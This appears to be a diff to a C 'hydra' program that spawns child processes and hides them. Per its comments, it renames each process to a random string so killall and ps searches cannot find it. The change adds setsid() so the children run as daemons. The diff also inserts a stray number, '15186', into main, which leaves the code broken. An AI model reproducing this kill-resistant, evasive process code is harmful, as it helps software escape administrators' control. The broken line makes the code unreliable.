@@ -46,6 +46,8 @@ pid_t new_head() {
         srand(getpid());
         //New process group
         setpgid(0, 0);
+        //Dameonize
+        setsid();
         //Set process name and command name to a
         //randomly generated string (prevent killall
         //or greping ps aux)
@@ -92,7 +94,7 @@ void check_weakness() {
 int main(int argc, char **argv1) {
     argv = argv1;
     srand (time(NULL));
-    
+    15186
     //Rebound sig int
     struct sigaction sigterm_action;
     sigterm_action.sa_sigaction = sigterm_handler;
@@ -110,7 +112,10 @@ int main(int argc, char **argv1) {
     rage = (int *) shmat(shmid, NULL, 0);
     *rage = -2;
     *(rage+1) = '\0';
-
+    
+    //The main hydra will run in the terminal
+    //All children will be dameonized
+    
     //Start the hydra with two heads
     if (new_head() != 0) {
         new_head();
